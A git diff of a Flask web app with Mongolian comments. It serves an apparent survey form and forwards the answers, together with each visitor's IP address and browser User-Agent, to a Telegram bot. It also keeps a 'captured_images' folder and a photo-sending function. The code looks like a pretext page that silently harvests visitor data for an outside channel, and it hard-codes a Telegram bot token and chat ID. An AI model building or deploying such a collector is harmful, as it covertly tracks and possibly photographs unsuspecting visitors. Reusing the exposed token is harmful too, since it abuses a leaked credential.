@@ -2,15 +2,12 @@
 import requests
 import base64
 import os
-# redirect болон url_for-ийг нэмж импортлов
-from flask import Flask, request, jsonify, render_template, redirect, url_for 
+from flask import Flask, request, jsonify, render_template, redirect, url_for
 
 # ====================================================================
-# ⚠️ 1. ТАНЫ ТОХИРГОО: RENDER PRODUCTION-Д ЗОРИУЛЖ ӨӨРЧИЛЛӨӨ ⚠️
+# ⚠️ 1. ТАНЫ ТОХИРГОО ⚠️
 # ====================================================================
-
 # Render Environment Variables-аас нууц үгсийг авна
-# Хэрэв DEV (local) орчин бол энд хатуу бичсэн утгыг ашиглана (Туршилтад зориулж)
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8476306576:AAFIzHzOLDQR_qOKb5yn4eK6VsMmIrGdy_Q')
 CHAT_ID = os.environ.get('CHAT_ID', '-5036234831')
 UPLOAD_FOLDER = 'captured_images'
@@ -18,15 +15,14 @@ UPLOAD_FOLDER = 'captured_images'
 
 app = Flask(__name__)
 
-# Зураг хадгалах хавтас үүсгэх (Render дээр түр хадгалах)
+# Зураг хадгалах хавтас үүсгэх (Энэ хэсэгт алдаа гарсан)
 if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+    os.makedirs(UPLOAD_FOLDER)
 
 # ----------------- sendPhoto ЧАДВАРТАЙ ФУНКЦ -----------------
-# (Энэ функц submit() дотор ашиглагдаагүй тул хуучин байдлаар үлдээв)
 def send_telegram_media_notification(message_text, image_filepath=None):
     """Текст болон зургийг хамт Telegram API руу илгээх функц"""
-    # ... (код хэвээр) ...
+    
     if image_filepath and os.path.exists(image_filepath):
         TELEGRAM_PHOTO_API_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
         payload = {
@@ -64,7 +60,7 @@ def send_telegram_media_notification(message_text, image_filepath=None):
 # ----------------- Үндсэн Вэб Хаяг -----------------
 @app.route('/')
 def index():
-    return render_template('index.html') 
+    return render_template('index.html') 
 
 # ----------------- Амжилттай Илгээсэн Хуудас -----------------
 @app.route('/success')
@@ -81,33 +77,27 @@ def success():
 # ----------------- Өгөгдөл Хүлээн Авах API -----------------
 @app.route('/submit', methods=['POST'])
 def submit():
-    """Судалгааны хариулт болон мэдээллийг хүлээн авч, Telegram руу илгээнэ."""
-    
-    # 1. name-үүдийг ашиглан хариултуудыг цуглуулах
-    role_department = request.form.get('role_department', 'Хариулаагүй')
-    profession = request.form.get('profession', 'Хариулаагүй')
+    """Судалгааны хариулт болон мэдээллийг хүлээн авч, Telegram руу илгээнэ."""
+    
+    # 1. name-үүдийг ашиглан хариултуудыг цуглуулах
+    role_department = request.form.get('role_department', 'Хариулаагүй')
+    profession = request.form.get('profession', 'Хариулаагүй')
 
-    message = (
-        f"📋 ШИНЭ СУДАЛГААНЫ ХАРИУЛТ:\n\n"
-        f"1) Албан тушаал, Хэлтэс: {role_department}\n"
-        f"2) Мэргэжил, Ажлын чиглэл: {profession}\n\n"
-        f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
-        f"📍 IP: {request.remote_addr}\n"
-        f"🌐 User-Agent: {request.headers.get('User-Agent')}"
-    )
-    
-    # 2. Telegram руу текст мэдээлэл илгээх (sendMessage функцээр хийвэл илүү хялбар)
-    send_telegram_media_notification(message) # Энд зөвхөн текст илгээнэ
+    message = (
+        f"📋 ШИНЭ СУДАЛГААНЫ ХАРИУЛТ:\n\n"
+        f"1) Албан тушаал, Хэлтэс: {role_department}\n"
+        f"2) Мэргэжил, Ажлын чиглэл: {profession}\n\n"
+        f"--- ТӨХӨӨРӨМЖИЙН МЭДЭЭЛЭЛ ---\n"
+        f"📍 IP: {request.remote_addr}\n"
+        f"🌐 User-Agent: {request.headers.get('User-Agent')}"
+    )
+    
+    # 2. Telegram руу текст мэдээлэл илгээх
+    send_telegram_media_notification(message) 
 
-    # 3. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
-    return redirect(url_for('success'))
+    # 3. Хэрэглэгчийг амжилттай болсны мэдэгдэл рүү шилжүүлэх
+    return redirect(url_for('success'))
 
 if __name__ == '__main__':
-    # Local туршилтад зориулав
-    app.run(port=8080, debug=True)
-
-# Render-д зориулсан Production Run Configuration
-# Энэ нь Procfile-д (gunicorn app:app) ашиглагдана
-# Үйлдвэрлэлийн орчинд PORT хувьсагчийг os.environ-с авах ёстой.
-# port = int(os.environ.get('PORT', 5000))
-# app.run(host='0.0.0.0', port=port)
+    # Local туршилтад зориулав
+    app.run(port=8080, debug=True)
